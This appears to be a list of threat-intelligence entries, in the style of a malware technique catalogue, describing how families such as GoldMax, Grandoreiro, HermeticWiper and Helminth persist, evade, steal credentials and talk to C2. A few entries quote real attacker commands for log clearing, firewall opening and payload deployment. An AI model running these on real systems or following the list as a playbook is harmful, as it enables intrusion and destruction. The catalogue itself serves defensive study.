Gelsemium can drop itself in `C:\Windows\System32\spool\prtprocs\x64\winprint.dll` as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.
GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.
GeminiDuke collects information on local user accounts from the victim.
GeminiDuke collects information on running processes and environment variables from the victim.
GeminiDuke collects information on network settings and Internet proxy settings from the victim.
GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup.
GeminiDuke uses HTTP and HTTPS for command and control.
Get2 has the ability to run executables with command-line arguments.
Get2 has the ability to inject DLLs into processes.
Get2 has the ability to identify running processes on an infected host.
Get2 has the ability to identify the computer name and Windows version of an infected host.
Get2 has the ability to identify the current username of an infected host.
Get2 has the ability to use HTTP to send information collected from an infected host to C2.
Gold Dragon encrypts data using Base64 before being sent to the command and control server.
Gold Dragon terminates anti-malware processes if they’re found running on the system.
Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence.
Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.
Gold Dragon can download additional components from the C2 server.
Gold Dragon stores information gathered from the endpoint in a file named 1.hwp.
Gold Dragon checks the running processes on the victim’s machine.
Gold Dragon enumerates registry keys with the command &lt;code&gt;regkeyenum&lt;/code&gt; and obtains information for the Registry key &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;.
Gold Dragon establishes persistence in the Startup folder.
Gold Dragon checks for anti-malware products and processes.
Gold Dragon collects endpoint information using the &lt;code&gt;systeminfo&lt;/code&gt; command.
Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.
Gold Dragon uses HTTP for communication to the control servers.
Gold Dragon uses cmd.exe to execute commands for discovery.
GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.
GoldFinder performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.
GoldFinder has used HTTP for C2.
GoldMax has RSA-encrypted its communication with the C2 server.
The GoldMax Linux variant has used a crontab entry with a &lt;code&gt;@reboot&lt;/code&gt; line to gain persistence.
GoldMax has decoded and decrypted the configuration file when executed.
GoldMax has written AES-encrypted and Base64-encoded configuration files to disk.
GoldMax can exfiltrate files over the existing C2 channel.
The GoldMax Linux variant has been executed with the `nohup` command to ignore hangup signals and continue to run if the terminal session was terminated.
GoldMax can download and execute additional files.
GoldMax has used decoy traffic to surround its malicious network traffic to avoid detection.
GoldMax has impersonated systems management software to avoid detection.
GoldMax has used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.
GoldMax has used scheduled tasks to maintain persistence.
GoldMax has been packed for obfuscation.
GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to &lt;code&gt;c8:27:cc:c2:37:5a&lt;/code&gt;.
GoldMax retrieved a list of the system's network interface after execution.
GoldMax can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server.
GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.
GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.
GoldMax can spawn a command shell, and execute native commands.
GoldenSpy has been packaged with a legitimate tax preparation software.
GoldenSpy's uninstaller has base64-encoded its variables.
GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006.
GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.
GoldenSpy has included a program "ExeProtector", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary.
GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system.
GoldenSpy can create new users on an infected system.
GoldenSpy's setup file installs initial executables under the folder &lt;code&gt;%WinDir%\System32\PluginManager&lt;/code&gt;.
GoldenSpy can execute remote commands in the Windows command shell using the &lt;code&gt;WinExec()&lt;/code&gt; API.
GoldenSpy has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.
GoldenSpy has gathered operating system information.
GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system.
GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication.
GoldenSpy can execute remote commands via the command-line interface.
GoldenSpy has established persistence by running in the background as an autostart service.
Goopy has had null characters padded in its malicious DLL payload.
Goopy has the ability to delete emails used for C2 once the content has been copied.
Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.
Goopy has the ability to communicate with its C2 over DNS.
Goopy has the ability to exfiltrate documents from infected systems.
Goopy has used a polymorphic decryptor to decrypt itself at runtime.
Goopy has the ability to disable Microsoft Outlook's security policies to disable macro warnings.
Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel.
Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.
Goopy has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.
Goopy has the ability to  enumerate the infected system's user name via &lt;code&gt;GetUserNameW&lt;/code&gt;.
Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.
Goopy has checked for the Google Updater process to ensure Goopy was loaded properly.
Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour.
Goopy has the ability to enumerate the infected system's user name.
Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.
Goopy has the ability to communicate with its C2 over HTTP.
Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.
Grandoreiro can identify installed security tools based on window names.
Grandoreiro can use SSL in C2 communication.
Grandoreiro can utilize web services including Google sites to send and receive C2 data.
Grandoreiro has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.
Grandoreiro can use malicious browser extensions to steal cookies and other user information.
Grandoreiro can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.
Grandoreiro can bypass UAC by registering as the default handler for .MSC files.
Grandoreiro can capture clipboard data from a compromised host.
Grandoreiro can steal cookie data and credentials from Google Chrome.
Grandoreiro can obtain C2 information from Google Docs.
Grandoreiro can decrypt its encrypted internal strings.
Grandoreiro can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.
Grandoreiro can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.
Grandoreiro can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.
Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer.
Grandoreiro can parse Outlook .pst files to extract e-mail addresses.
The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.
Grandoreiro can send data it retrieves to the C2 server.
Grandoreiro can delete .LNK files created in the Startup folder.
Grandoreiro can store its configuration in the Registry at `HKCU\Software\` under frequently changing names including &lt;code&gt;%USERNAME%&lt;/code&gt; and &lt;code&gt;ToolTech-RM&lt;/code&gt;.
Grandoreiro can download its second stage from a hardcoded URL within the loader's code.
Grandoreiro can log keystrokes on the victim's machine.
Grandoreiro has infected victims via malicious attachments.
Grandoreiro has used malicious links to gain execution on victim machines.
Grandoreiro has named malicious browser extensions and update files to appear legitimate.
Grandoreiro can modify the Registry to store its configuration at `HKCU\Software\` under frequently changing names including &lt;code&gt;%USERNAME%&lt;/code&gt; and &lt;code&gt;ToolTech-RM&lt;/code&gt;.
Grandoreiro can use MSI files to execute DLLs.
Grandoreiro can execute through the &lt;code&gt;WinExec&lt;/code&gt; API.
Grandoreiro can identify installed security tools based on process names.
Grandoreiro can use run keys and create link files in the startup folder for persistence.
Grandoreiro can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.
Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions.
Grandoreiro has been spread via malicious links embedded in e-mails.
Grandoreiro can steal the victim's cookies to use for duplicating the active session from another device.
Grandoreiro can detect VMWare via its I/O port and Virtual PC via the &lt;code&gt;vpcext&lt;/code&gt; instruction.
Grandoreiro can collect the computer name and OS version from a compromised host.
Grandoreiro can determine the IP and physical location of the compromised host via IPinfo.
Grandoreiro can collect the username from the victim's machine.
Grandoreiro can determine the time on the victim machine via IPinfo.
Grandoreiro can use VBScript to execute malicious code.
Grandoreiro has the ability to use HTTP in C2 communications.
Grandoreiro can modify the binary ACL to prevent security tools from running.
GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.
GravityRAT steals files based on an extension list if a USB drive is connected to the system.
GravityRAT has been delivered via Word documents using DDE for execution.
GravityRAT supports file encryption (AES with the key "lolomycin2017").
GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.
The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.
GravityRAT has used HTTP over a non-standard port, such as TCP port 46769.
GravityRAT lists the running processes on the system.
GravityRAT creates a scheduled task to ensure it is re-executed everyday.
GravityRAT uses WMI to check the BIOS and manufacturer information for strings like "VMWare", "Virtual", and "XEN" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment.
GravityRAT collects the MAC address, computer name, and CPU information.
GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.
GravityRAT uses the &lt;code&gt;netstat&lt;/code&gt; command to find open ports on the victim’s machine.
GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).
GravityRAT has a feature to list the available services on the system.
GravityRAT can obtain the date and time of a system.
GravityRAT uses HTTP for C2.
GravityRAT executes commands remotely on the infected host.
GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).
Green Lambert can use DNS for C2 communications.
Green Lambert can collect data from a compromised host.
Green Lambert can use multiple custom routines to decrypt strings prior to execution.
Green Lambert can delete the original executable after initial installation in addition to unused functions.
Green Lambert can use Keychain Services API functions to find and collect passwords, such as `SecKeychainFindInternetPassword` and `SecKeychainItemCopyAttributesAndData`.
Green Lambert can create a Launch Agent with the `RunAtLoad` key-value pair set to &lt;code&gt;true&lt;/code&gt;, ensuring the `com.apple.GrowlHelper.plist` file runs every time a user logs in.
Green Lambert can add a plist file in the `Library/LaunchDaemons` to establish persistence.
Green Lambert can add Login Items to establish persistence.
Green Lambert has created a new executable named `Software Update Check` to appear legitimate.
Green Lambert has been disguised as a Growl help file.
Green Lambert has encrypted strings.
Green Lambert can use proxies for C2 traffic.
Green Lambert can add &lt;code&gt;init.d&lt;/code&gt; and &lt;code&gt;rc.d&lt;/code&gt; files in the &lt;code&gt;/etc&lt;/code&gt; folder to establish persistence.
Green Lambert can use `uname` to identify the operating system name, version, and processor type.
Green Lambert can obtain proxy information from a victim's machine using system environment variables.
Green Lambert can collect the date and time from a compromised host.
Green Lambert can use shell scripts for execution, such as &lt;code&gt;/bin/sh -c&lt;/code&gt;.
Green Lambert can establish persistence on a compromised host through modifying the `profile`, `login`, and run command (rc) files associated with the `bash`, `csh`, and `tcsh` shells.
GreyEnergy encrypts communications using RSA-2048.
GreyEnergy digitally signs the malware with a code-signing certificate.
GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.
GreyEnergy can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.
GreyEnergy can download additional modules and payloads.
GreyEnergy has a module to harvest pressed keystrokes.
GreyEnergy has a module for Mimikatz to collect Windows credentials from the victim’s machine.
GreyEnergy modifies conditions in the Registry and adds keys.
GreyEnergy has used Tor relays for Command and Control servers.
GreyEnergy has a module to inject a PE binary into a remote process.
GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).
GreyEnergy is packed for obfuscation.
GreyEnergy encrypts communications using AES256.
GreyEnergy enumerates all Windows services.
GreyEnergy uses HTTP and HTTPS for C2 communications.
GreyEnergy uses cmd.exe to execute itself in-memory.
GreyEnergy chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.
GrimAgent can use a hardcoded server public RSA key to encrypt the first request to C2.
GrimAgent has the ability to add bytes to change the file hash.
GrimAgent can delete previously created tasks on a compromised host.
GrimAgent can collect data and files from a compromised host.
GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.
GrimAgent has sent data related to a compromise host over its C2 channel.
GrimAgent can delete old binaries on a compromised host.
GrimAgent has the ability to enumerate files and directories on a compromised host.
GrimAgent has the ability to download and execute additional payloads.
GrimAgent  can pad C2 messages with random generated values.
GrimAgent can use Native API including &lt;code&gt;GetProcAddress&lt;/code&gt; and &lt;code&gt;ShellExecuteW&lt;/code&gt;.
GrimAgent has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.
GrimAgent can set persistence with a Registry run key.
GrimAgent has the ability to set persistence using the Task Scheduler.
GrimAgent can base64 encode C2 replies.
GrimAgent can use an AES key to encrypt C2 communications.
GrimAgent can collect the OS, and build version on a compromised host.
GrimAgent has used &lt;code&gt;Accept-Language&lt;/code&gt; to identify hosts in the United Kingdom, United States, France, and Spain.
GrimAgent can identify the country code on a compromised host.
GrimAgent can enumerate the IP and domain of a target system.
GrimAgent can identify the user id on a target machine.
GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task.
GrimAgent has the ability to use HTTP for C2 communications.
GrimAgent can use the Windows Command Shell to execute commands, including its own removal.
GuLoader can delete its executable from the &lt;code&gt;AppData\Local\Temp&lt;/code&gt; directory on the compromised host.
GuLoader can download further malware for execution on the victim's machine.
The GuLoader executable has been retrieved via embedded macros in malicious Word documents.
GuLoader has relied upon users clicking on links to malicious documents.
GuLoader can use a number of different APIs for discovery and execution.
GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process.
GuLoader can establish persistence via the Registry under &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;.
GuLoader has been spread in phishing campaigns using malicious web links.
GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call &lt;code&gt;EnumWindows&lt;/code&gt;, and checking for Qemu guest agent.
GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID.
GuLoader can use HTTP to retrieve additional binaries.
GuLoader has the ability to download malware from Google Drive.
H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).
H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.
H1N1 obfuscates C2 traffic with an altered version of base64.
H1N1 kills and disables services for Windows Firewall.
H1N1 kills and disables services for Windows Security Center, and Windows Defender.
H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.
H1N1 disable recovery options and deletes shadow copies from the victim.
H1N1 uses multiple techniques to obfuscate strings, including XOR.
H1N1 has functionality to copy itself to removable media.
H1N1 uses a custom packing algorithm.
H1N1 encrypts C2 traffic using an RC4 key.
H1N1 has functionality to copy itself to network shares.
H1N1 kills and disables services by using cmd.exe.
HALFBAKED can delete a specified file.
HALFBAKED can execute PowerShell scripts.
HALFBAKED can obtain information about running processes on the victim.
HALFBAKED can obtain screenshots from the victim.
HALFBAKED can obtain information about the OS, processor, and BIOS.
HALFBAKED can use WMI queries to gather system information.
HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.
HAMMERTOSS has used &lt;code&gt;-WindowStyle hidden&lt;/code&gt; to conceal PowerShell windows.
The "tDiscoverer" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.
HAMMERTOSS is known to use PowerShell.
HAMMERTOSS is controlled via commands that are appended to image files.
Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.
The "Uploader" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands.
can download and execute a second-stage payload.
can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.
can collect the victim user name.
HARDRAIN opens the Windows Firewall to modify incoming connections.
HARDRAIN binds and listens on port 443 with a FakeTLS method.
HARDRAIN uses FakeTLS to communicate with its C2 server.
HARDRAIN uses the command &lt;code&gt;cmd.exe /c netsh firewall add portopening TCP 443 "adp"&lt;/code&gt; and makes the victim machine function as a proxy server.
HARDRAIN uses cmd.exe to execute &lt;code&gt;netsh&lt;/code&gt;commands.
HAWKBALL has encrypted data with XOR before sending it over the C2 channel.
HAWKBALL has used an OLE object that uses Equation Editor to drop the embedded shellcode.
HAWKBALL has encrypted the payload with an XOR-based algorithm.
HAWKBALL has sent system information and files over the C2 channel.
HAWKBALL has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.
HAWKBALL has the ability to delete files.
HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.
HAWKBALL can collect the OS version, architecture information, and computer name.
HAWKBALL can collect the user name of the system.
HAWKBALL has used HTTP to communicate with a single hard-coded C2 server.
HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.
HDoor kills anti-virus found on the victim.
HDoor scans to identify open ports on the victim.
HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom.
HELLOKITTY can delete volume shadow copies on compromised hosts.
HELLOKITTY has the ability to enumerate network resources.
HELLOKITTY can search for specific processes to terminate.
HELLOKITTY can enumerate logical drives on a target system.
HELLOKITTY can use WMI to delete volume shadow copies.
HIDEDRV injects a DLL for Downdelph into the explorer.exe process.
HIDEDRV is a rootkit that hides certain operating system artifacts.
Some strings in HOMEFRY are obfuscated with XOR x56.
HOMEFRY can perform credential dumping.
HOMEFRY uses a command-line interface.
HOPLIGHT can enumerate device drivers located in the registry at `HKLM\Software\WBEM\WDM`.
HOPLIGHT has modified the firewall using netsh.
HOPLIGHT has used its C2 channel to exfiltrate data.
HOPLIGHT has multiple C2 channels in place in case one fails.
HOPLIGHT has been observed enumerating system drives and partitions.
HOPLIGHT has the ability to connect to a remote host in order to upload and download files.
HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.
HOPLIGHT has connected outbound over TCP port 443 with a FakeTLS method.
HOPLIGHT has been observed loading several APIs associated with Pass the Hash.
HOPLIGHT has injected into running processes.
HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators.
A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key &lt;code&gt;SYSTEM\CurrentControlSet\Control\Lsa Name&lt;/code&gt;.
HOPLIGHT has the capability to harvest credentials and passwords from the SAM database.
HOPLIGHT has used svchost.exe to execute a malicious DLL .
HOPLIGHT has utilized Zlib compression to obfuscate the communications payload.
HOPLIGHT has been observed collecting victim machine information like OS version, volume information, and more.
HOPLIGHT has been observed collecting system time from victim machines.
HOPLIGHT can launch cmd.exe to execute commands on the system.
HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.
HOPLIGHT can use WMI event subscriptions to create persistence.
HTRAN can inject into into running processes.
HTRAN can proxy TCP socket connections to obfuscate command and control infrastructure.
HTRAN can install a rootkit to hide network connections from the host OS.
HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.
HTTPBrowser has used DLL side-loading.
HTTPBrowser has used DNS for command and control.
HTTPBrowser deletes its original installer file once installation is complete.
HTTPBrowser is capable of listing files, folders, and drives on a victim.
HTTPBrowser is capable of writing a file to the compromised system from the C2 server.
HTTPBrowser is capable of capturing keystrokes on victims.
HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.
HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.
HTTPBrowser has established persistence by setting the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; key value for &lt;code&gt;wdm&lt;/code&gt; to the path of the executable. It has also used the Registry entry &lt;code&gt;HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe”&lt;/code&gt; to establish persistence.
HTTPBrowser has used HTTP and HTTPS for command and control.
HTTPBrowser is capable of spawning a reverse shell on a victim.
HUI Loader can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.
HUI Loader can decrypt and load files containing malicious payloads.
HUI Loader has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.
Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.
Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.
Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files.
Hancitor has deleted files using the VBA &lt;code&gt;kill&lt;/code&gt; function.
Hancitor has the ability to download additional files from C2.
Hancitor has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.
Hancitor has relied upon users clicking on a malicious link delivered through phishing.
Hancitor has used &lt;code&gt;CallWindowProc&lt;/code&gt; and &lt;code&gt;EnumResourceTypesA&lt;/code&gt; to interpret and execute shellcode.
Hancitor has used Base64 to encode malicious links. Hancitor has also delivered compressed payloads in ZIP files to victims.
Hancitor has used PowerShell to execute commands.
Hancitor  has added Registry Run keys to establish persistence.
Hancitor has been delivered via phishing emails with malicious attachments.
Hancitor has been delivered via phishing emails which contained malicious links.
Hancitor has used verclsid.exe to download and execute a malicious script.
Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.
Havij is used to automate SQL injection.
A Helminth VBScript receives a batch script to execute a set of commands in a command prompt.
The executable version of Helminth has a module to log clipboard contents.
Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.
Helminth can use DNS for C2.
Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.
Helminth has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands &lt;code&gt;net group Exchange Trusted Subsystem /domain&lt;/code&gt; and &lt;code&gt;net group domain admins /domain&lt;/code&gt;.
The Helminth config file is encrypted with RC4.
Helminth can download additional files.
The executable version of Helminth has a module to log keystrokes.
Helminth creates folders to store output from batch scripts prior to sending the information to its C2 server.
Helminth has checked the local administrators group.
One version of Helminth uses a PowerShell script.
Helminth has used Tasklist to get information on processes.
Helminth establishes persistence by creating a shortcut in the Start Menu folder.
Helminth has used a scheduled task for persistence.
Helminth establishes persistence by creating a shortcut.
For C2 over HTTP, Helminth encodes data with base64 and sends it via the "Cookie" field of HTTP requests. For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the data in cleartext.
Helminth encrypts data sent to its C2 server over HTTP with RC4.
One version of Helminth consists of VBScript scripts.
Helminth can use HTTP for C2.
Helminth can provide a remote shell. One version of Helminth uses batch scripting.
HermeticWiper can use `AdjustTokenPrivileges` to grant itself privileges for debugging with `SeDebugPrivilege`, creating backups with `SeBackupPrivilege`, loading drivers with `SeLoadDriverPrivilege`, and shutting down a local system with `SeShutdownPrivilege`.
HermeticWiper can overwrite the `C:\Windows\System32\winevt\Logs` file on a targeted system.
The HermeticWiper executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.
HermeticWiper can recursively wipe folders and files in `Windows`, `Program Files`, `Program Files(x86)`, `PerfLogs`, `Boot, System`, `Volume Information`, and `AppData` folders using `FSCTL_MOVE_FILE`. HermeticWiper can also overwrite symbolic links and big files in `My Documents` and on the Desktop with random bytes.
HermeticWiper can decompress and copy driver files using `LZCopy`.
HermeticWiper has the ability to corrupt disk partitions and obtain raw disk access to destroy data.
HermeticWiper has the ability to corrupt disk partitions, damage the Master Boot Record (MBR), and overwrite the Master File Table (MFT) of all available physical drives.
HermeticWiper can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.
HermeticWiper has the ability to overwrite its own file with random bites.
HermeticWiper can enumerate common folders such as My Documents, Desktop, and AppData.
HermeticWiper has the ability to deploy through an infected system's default domain policy.
HermeticWiper has the ability to set the `HKLM:\SYSTEM\\CurrentControlSet\\Control\\CrashControl\CrashDumpEnabled` Registry key to `0` in order to disable crash dumps.
HermeticWiper can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.
HermeticWiper can disable the VSS service on a compromised host using the service control manager.
HermeticWiper has used the name `postgressql.exe` to mask a malicious payload.
HermeticWiper has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.
HermeticWiper can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.
HermeticWiper has the ability to use scheduled tasks for execution.
HermeticWiper can create system services to aid in executing the payload.
HermeticWiper has the ability to stop the Volume Shadow Copy service.
HermeticWiper can determine the OS version, bitness, and enumerate physical drives on a targeted host.
HermeticWiper can initiate a system shutdown.
HermeticWiper has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.
HermeticWiper can use `cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1&gt; \\127.0.0.1\ADMIN$\_1636727589.6007507 2&gt;&amp;1` to deploy on an infected system.
HermeticWiper can load drivers by creating a new service using the `CreateServiceW` API.
HermeticWizard has the ability to use `wevtutil cl system` to clear event logs.
HermeticWizard has been signed by valid certificates assigned to Hermetica Digital.
HermeticWizard can execute files on remote machines using DCOM.
HermeticWizard has the ability to encrypt PE files with a reverse XOR loop.
HermeticWizard can copy files to other machines on a compromised network.
HermeticWizard has been named `exec_32.dll` to mimic a legitimate MS Outlook .dll.
HermeticWizard can connect to remote shares using `WNetAddConnection2W`.
HermeticWizard has the ability to scan ports on a compromised network.
HermeticWizard can use a list of hardcoded credentials in attempt to authenticate to SMB shares.
HermeticWizard has used `regsvr32.exe /s /i` to execute malicious payloads.
HermeticWizard can find machines on the local network by gathering known local IP addresses through `DNSGetCacheDataTable`, `GetIpNetTable`,`WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)`,`NetServerEnum`,`GetTcpTable`, and `GetAdaptersAddresses.`
HermeticWizard has the ability to create a new process using `rundll32`.
HermeticWizard can use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems.
HermeticWizard can use `OpenRemoteServiceManager` to create a service.
HermeticWizard can use `cmd.exe` for execution on compromised hosts.
HermeticWizard can use WMI to create a new process on a remote machine via `C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll`.
Heyoka Backdoor can use DNS tunneling for C2 communications.
Heyoka Backdoor can decrypt its payload prior to execution.
Heyoka Backdoor can inject a DLL into rundll32.exe for execution.
Heyoka Backdoor can encrypt its payload.
Heyoka Backdoor has the ability to delete folders and files from a targeted system.
Heyoka Backdoor has the ability to search the compromised host for files.
Heyoka Backdoor has been spread through malicious document lures.
Heyoka Backdoor has been named `srvdll.dll` to appear as a legitimate service.
Heyoka Backdoor can identify removable media attached to victim's machines.
Heyoka Backdoor can gather process information.
Heyoka Backdoor can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.
Heyoka Backdoor can establish persistence with the auto start function including using the value `EverNoteTrayUService`.
Heyoka Backdoor can use rundll32.exe to gain execution.
Heyoka Backdoor can enumerate drives on a compromised host.
Heyoka Backdoor can check if it is running as a service on a compromised host.
Hi-Zor encrypts C2 traffic with TLS.
Hi-Zor uses various XOR techniques to obfuscate its components.
Hi-Zor deletes its RAT installer file as it executes its DLL payload file.
Hi-Zor has the ability to upload and download files from its C2 server.
Hi-Zor creates a Registry Run key to establish persistence.
Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.
Hi-Zor encrypts C2 traffic with a double XOR using two distinct single-byte keys.
Hi-Zor communicates with its C2 server over HTTPS.
Hi-Zor has the ability to create a reverse shell.
HiddenWasp uses a cipher to implement a decoding function.
HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable.
HiddenWasp encrypts its configuration and payload.
HiddenWasp downloads a tar compressed archive from a download server to the system.
HiddenWasp creates a user account as a means to provide initial persistence to the compromised machine.
HiddenWasp communicates with a simple network protocol over TCP.
HiddenWasp installs reboot persistence by adding itself to &lt;code&gt;/etc/rc.local&lt;/code&gt;.
HiddenWasp uses a rootkit to hook and implement functions on the system.
HiddenWasp uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.
HiddenWasp uses a script to automate tasks on the victim's machine and to assist in execution.
Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.
Hikit has used DLL Search Order Hijacking to load &lt;code&gt;oci.dll&lt;/code&gt; as a persistence mechanism.
Hikit can upload files from compromised machines.
Hikit has the ability to download files to a compromised host.
Hikit installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher.
Hikit supports peer connections.
Hikit has been spread through spear phishing.
Hikit is a Rootkit that has been used by Axiom.
Hikit performs XOR encryption.
Hikit has used HTTP for C2.
Hikit has the ability to create a remote shell and run given commands.
Hildegard has used an IRC channel for C2 communications.
Hildegard has used history -c to clear script shell logs.
Hildegard has queried the Cloud Instance Metadata API for cloud credentials.
Hildegard was executed through the kubelet API run command and by executing commands on running containers.
Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers.
